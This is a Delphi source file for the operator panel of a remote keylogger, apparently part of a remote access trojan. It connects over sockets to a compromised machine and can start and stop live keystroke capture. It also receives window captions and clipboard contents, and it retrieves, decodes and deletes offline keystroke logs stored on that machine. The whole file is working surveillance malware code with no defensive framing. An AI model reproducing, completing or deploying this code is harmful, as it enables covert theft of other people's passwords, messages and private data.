unit UnitKeyLogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb,StrUtils;

type
  TKeyLogger = class(TForm)
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    Active1: TMenuItem;
    N1: TMenuItem;
    Save1: TMenuItem;
    Search1: TMenuItem;
    Clear1: TMenuItem;
    SaveDialog1: TSaveDialog;
    N2: TMenuItem;
    ImageList1: TImageList;
    PopupMenu2: TPopupMenu;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    PopupMenu3: TPopupMenu;
    MenuItem8: TMenuItem;
    Active2: TMenuItem;
    N3: TMenuItem;
    Panel1: TPanel;
    RichEdit1: TRichEdit;
    Panel2: TPanel;
    TreeView1: TTreeView;
    Splitter1: TSplitter;
    RichEdit2: TRichEdit;
    Timer1: TTimer;
    FindDialog1: TFindDialog;
    ProgressBar1: TProgressBar;
    procedure RichEdit1Change(Sender: TObject);
    procedure Active1Click(Sender: TObject);
    procedure Save1Click(Sender: TObject);
    procedure Clear1Click(Sender: TObject);
    procedure Search1Click(Sender: TObject);
    procedure TreeView1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure TreeView1DblClick(Sender: TObject);
    procedure MenuItem8Click(Sender: TObject);
    procedure Active2Click(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure MenuItem3Click(Sender: TObject);
    procedure FindDialog1Find(Sender: TObject);
  private
    { Private declarations }
    FSelPos: integer;
    LastNode: TTreeNode;
    LastLog: string;
    procedure AddAllFolders(Folders: string);
  public
    { Public declarations }
    Offline: bool;
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);

  end;

var
  KeyLogger: TKeyLogger;

implementation

uses UnitSettings, UnitKeyLogFilter;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'KeyLogger|' + Data);
end;

procedure SendDataOffline(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'OfflineKeyLogger|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TKeyLogger(SocketData.Form).NewSocket = nil then exit;
  TKeyLogger(SocketData.Form).Timer1.Enabled := True;
  TKeyLogger(SocketData.Form).NewSocket := nil;
  TKeyLogger(SocketData.Form).Caption := TKeyLogger(SocketData.Form).Caption + ' - [Offline]';
end;

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  TKeyLogger(SocketData.Form).ProgressBar1.Max := Max;
  TKeyLogger(SocketData.Form).ProgressBar1.Position := Progress;
end;

procedure TKeyLogger.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  if (Treeview1.Items.Count = 1) and (Offline = True) then begin
    Statusbar1.SimpleText := 'Updating Logs';
    SendDataOffline(Socket,'Logs');
  end;

  if Offline = False then begin
    if Active1.Checked then SendData(Socket,'Start');
  end;

end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

procedure TKeyLogger.AddAllFolders(Folders: string);
var
  tmp: string;
  node: ttreenode;
begin
  lastnode := nil;
  while length(Folders) > 0 do begin
    tmp := Split(Folders,'\',1);
    delete(Folders,1,length(tmp)+1);
    if length(tmp) = 2 then tmp := tmp + '\';
    node := FindNode(tmp,Treeview1,LastNode);
    if node = nil then begin
      Node := Treeview1.Items.AddChild(LastNode,tmp);
      Node.ImageIndex := 4;
      Node.SelectedIndex := 4;
      //Node.Expand(False);
    end else begin
      //Node := Treeview1.Items.AddChild(Node,Tmp);
      //Node.Expand(False);
    end;
    if node.Parent <> nil then node.Parent.Expand(false);
    lastnode := node;
    //lastnode.Expand(false);
  end;
end;

procedure AddData(RichEdit: TRichEdit; Command,Data: string);
var
  Tmp: string;
  p,i: integer;
  Strings: TStringList;
  StringList: TStringList;
  Date,Time,Cap: string;
  Path,Name: string;
  p1,p2: integer;
  special: string;
  Li: TListItem;
begin

  if Command = 'Caption' then begin
    Date := Split(Data,'|',1);
    Delete(Data,1,Length(Date)+1);
    Cap := Data;

    Li := nil;
    for i := 0 to KeyLogFilter.ListView1.Items.Count -1 do begin
      if Pos(KeyLogFilter.ListView1.Items[i].Caption,LowerCase(Cap)) > 0 then begin
        Li := KeyLogFilter.ListView1.Items[i];
        Break;
      end;
    end;

    if Li <> nil then begin
      RichEdit.SelStart := RichEdit.GetTextLen;
      RichEdit.SelAttributes.Color := TColor(strtoint(Li.SubItems[0]));
      RichEdit.SelText := #13#10#13#10 + '[' + Cap + ']';
    end else begin
      RichEdit.SelStart := RichEdit.GetTextLen;
      RichEdit.SelAttributes.Color := Settings.ColorBox2.Selected;
      RichEdit.SelText := #13#10#13#10 + '[' + Cap + ']';
    end;

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := clBlack;
    RichEdit.SelText := ' - ';

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := Settings.ColorBox3.Selected;
    RichEdit.SelText := Date + #13#10;

  end;

  if Command = 'SingleKey' then begin
    while Length(Data) > 0 do begin
      Application.ProcessMessages;

      p1 := Pos('<specialkey>',Data);
      p2 := Pos('</specialkey>',Data);

      if p1 = 0 then begin
        RichEdit.SelStart := RichEdit.GetTextLen;
        RichEdit.SelAttributes.Color := Settings.ColorBox4.Selected;
        RichEdit.SelText := Data;
        Delete(Data,1,Length(Data));
        Continue;
      end;

      if p1 = 1 then begin
        Special := Copy(Data,p1 + 12,p2-13);
        RichEdit.SelStart := RichEdit.GetTextLen;
        RichEdit.SelAttributes.Color := Settings.ColorBox5.Selected;
        if LowerCase(Special) = '[enter]' then begin
          RichEdit.Lines.Add('');
        end else begin
          if not Settings.CheckBox7.Checked then RichEdit.SelText := Special;
        end;
        Delete(Data,p1,p2+12);
        Continue;
      end;

      Special := Copy(Data,1,p1-1);
      RichEdit.SelStart := RichEdit.GetTextLen;
      RichEdit.SelAttributes.Color := Settings.ColorBox4.Selected;
      RichEdit.SelText := Special;
      Delete(Data,1,Length(Special));

    end;

  end;

  if Command = 'SpecialKey' then begin
    if Settings.CheckBox7.Checked then exit;
    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := Settings.ColorBox5.Selected;
    RichEdit.SelText := Data;
  end;

  if Command = 'Clipboard' then begin
    Date := Split(Data,'|',1);
    Delete(Data,1,Length(Date)+1);
    Cap := Data;

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := Settings.ColorBox2.Selected;
    RichEdit.SelText := #13#10#13#10 + '[Clipboard Text Changed]';

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := clBlack;
    RichEdit.SelText := ' - ';

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := Settings.ColorBox3.Selected;
    RichEdit.SelText := Date + #13#10;

    RichEdit.SelStart := RichEdit.GetTextLen;
    RichEdit.SelAttributes.Color := Settings.ColorBox6.Selected;
    RichEdit.SelText := Data;
  end;
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := 1 to length(St) do begin
    A := ord(St[i]);
    result := result + char(a+1);
  end;
end;

procedure TKeyLogger.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Tmp: string;
  Size,p,i: integer;
  Strings: TStringList;
  StringList: TStringList;
  Date,Time,Cap: string;
  Logs: TStringList;
  Path,Name: string;
  node: ttreenode;
begin

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Caption' then begin
    AddData(RichEdit1,Command,Data);
  end;

  if Command = 'SingleKey' then begin
    AddData(RichEdit1,Command,Data);
  end;

  if Command = 'Clipboard' then begin
    AddData(RichEdit1,Command,Data);
  end;

  if Command = 'Logs' then begin
    Treeview1.Items.BeginUpdate;
    Logs := TStringList.Create;
    Logs.Text := Data;
    for i := 0 to Logs.Count -1 do begin
      Name := ExtractFileName(Logs[i]);
      Path := ExtractFileDir(Logs[i]);
      Path := ExtractFileName(Path);
      AddAllFolders('Logs\' + Path);
      Node := Treeview1.Items.AddChild(LastNode,Copy(Name,1,10));
      Node.ImageIndex := 3;
      Node.SelectedIndex := 3;
      //Lastnode.Expand(True);
    end;
    Statusbar1.SimpleText := inttostr(Logs.Count) + ' Logs';
    Logs.Free;
    Treeview1.Items.EndUpdate;
  end;

  if Command = 'GetLog' then begin
    Richedit2.Text := '';
    Data := Ca(Data);

    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    Progressbar1.Position := 0;
    Progressbar1.Max := Stream.Size;

    while Stream.Position < Stream.Size do begin
      Stream.Read(Size,Sizeof(Integer));
      SetLength(Data,Size);
      Stream.Read(pointer(Data)^,Size);
      Command := Split(Data,'|',1);
      Delete(Data,1,Length(Command)+1);
      AddData(RichEdit2,Command,Data);
      Progressbar1.Position := Stream.Position;
      Application.ProcessMessages;
    end;
    Progressbar1.Position := Progressbar1.Max;
    Stream.Free;
    Treeview1.Enabled := True;
    RichEdit2.Enabled := True;
  end;

  if Command = 'Status' then begin
    Statusbar1.SimpleText := Data;
  end;




end;

procedure TKeyLogger.RichEdit1Change(Sender: TObject);
begin
  if TRichEdit(Sender).Lines[0] = '' then TRichEdit(Sender).Lines.Delete(0);
end;

procedure TKeyLogger.Active1Click(Sender: TObject);
begin
  Active1.Checked := not Active1.Checked;
  if Active1.Checked then begin
    SendData(NewSocket,'Start');
  end else begin
    SendData(NewSocket,'Stop');
  end
end;

procedure TKeyLogger.Save1Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  RichEdit1.Lines.SaveToFile(SaveDialog1.FileName);
end;

procedure TKeyLogger.Clear1Click(Sender: TObject);
begin
  RichEdit1.Clear;
end;

function SearchForText_AndSelect(RichEdit: TRichEdit; SearchText: string): Boolean;
var
  StartPos, Position, Endpos: Integer;
begin
  StartPos := 0;
  with RichEdit do
  begin
    Endpos := Length(RichEdit.Text);
    Lines.BeginUpdate;
    while FindText(SearchText, StartPos, Endpos, [stMatchCase])<>-1 do
    begin
      Endpos   := Length(RichEdit.Text) - startpos;
      Position := FindText(SearchText, StartPos, Endpos, [stMatchCase]);
      Inc(StartPos, Length(SearchText));
      SetFocus;
      SelStart  := Position;
      SelLength := Length(SearchText);
    end;
    Lines.EndUpdate;
  end;
end;

procedure TKeyLogger.Search1Click(Sender: TObject);
var
  s: string;
begin
  s := inputbox('Search','Enter search phase','');
  if s = '' then exit;
  SearchForText_AndSelect(RichEdit1,s);
end;

procedure TKeyLogger.TreeView1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  tmpNode: TTreeNode;
begin
  tmpNode := (Sender as TTreeView).GetNodeAt(MousePos.X, MousePos.Y);
  if tmpNode <> nil then TTreeView(Sender).Selected := tmpNode;
end;


procedure TKeyLogger.TreeView1DblClick(Sender: TObject);
var
  path: string;
begin
  if not assigned(Treeview1.Selected) then exit;
  if Treeview1.Selected.ImageIndex <> 3 then exit;
  Treeview1.Enabled := False;
  RichEdit2.Enabled := False;
  path := Treeview1.Selected.Parent.Text + '\' + Copy(Treeview1.Selected.Text,1,10);
  LastLog := Path;
  SendDataOffline(NewSocket,'GetLog|' + Path);
end;

procedure TKeyLogger.MenuItem8Click(Sender: TObject);
var
  path: string;
begin
  if not assigned(Treeview1.Selected) then exit;




  if Treeview1.Selected.ImageIndex = 3 then begin
    path := Treeview1.Selected.Parent.Text + '\' + Treeview1.Selected.Text;
    SendDataOffline(NewSocket,'Delete|' + Path)
  end else begin
    path := Treeview1.Selected.Text;
    SendDataOffline(NewSocket,'Delete|' + Path);
  end;

  Treeview1.Selected.Delete;
  if LastLog = Path then RichEdit2.Clear;
end;

procedure TKeyLogger.Active2Click(Sender: TObject);
begin
  Active2.Checked := not Active2.Checked;
  if Active2.Checked then begin
    SendDataOffline(NewSocket,'Start');
    TSocketData(MainSocket.Data).ServerData.OfflineLogger := 'True';
  end else begin
    SendDataOffline(NewSocket,'Stop');
    TSocketData(MainSocket.Data).ServerData.OfflineLogger := 'False';
  end;
end;

procedure TKeyLogger.MenuItem4Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  RichEdit2.Lines.SaveToFile(SaveDialog1.FileName);
end;

procedure TKeyLogger.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
    UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|KeyLoggerSocket|' + inttostr(Self.Handle));
end;

procedure TKeyLogger.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TKeyLogger.MenuItem3Click(Sender: TObject);
begin
  FSelPos := 0;
  FindDialog1.Execute;
end;

procedure TKeyLogger.FindDialog1Find(Sender: TObject);
var
  S : string;
  startpos : integer;
begin
  with TFindDialog(Sender) do begin
    {If the stored position is 0 this cannot be a find next. }
    if FSelPos = 0 then Options := Options - [frFindNext];

     { Figure out where to start the search and get the corresponding
       text from the memo. }
    if frfindNext in Options then begin
      { This is a find next, start after the end of the last found word. }
      StartPos := FSelPos + Length(Findtext);
      S := Copy(RichEdit2.Lines.Text, StartPos, MaxInt);
    end else begin
      { This is a find first, start at the, well, start. }
      S := RichEdit2.Lines.Text;
      StartPos := 1;
    end;

    { Perform a global case-sensitive search for FindText in S }
    FSelPos := Pos(FindText, S);
    if FSelPos > 0 then begin
       { Found something, correct position for the location of the start of search. }
      FSelPos := FSelPos + StartPos - 1;
      RichEdit2.SelStart := FSelPos - 1;
      RichEdit2.SelLength := Length(FindText);
      RichEdit2.SetFocus;
    end else begin
      { No joy, show a message. }
      if frfindNext in Options then S := Concat('Could not find "', FindText,'" ')
      else S := Concat('Could not find "', FindText, '" in Memo1.');
      MessageDlg(S, mtError, [mbOK], 0);
    end;
    
  end;
end;

end.
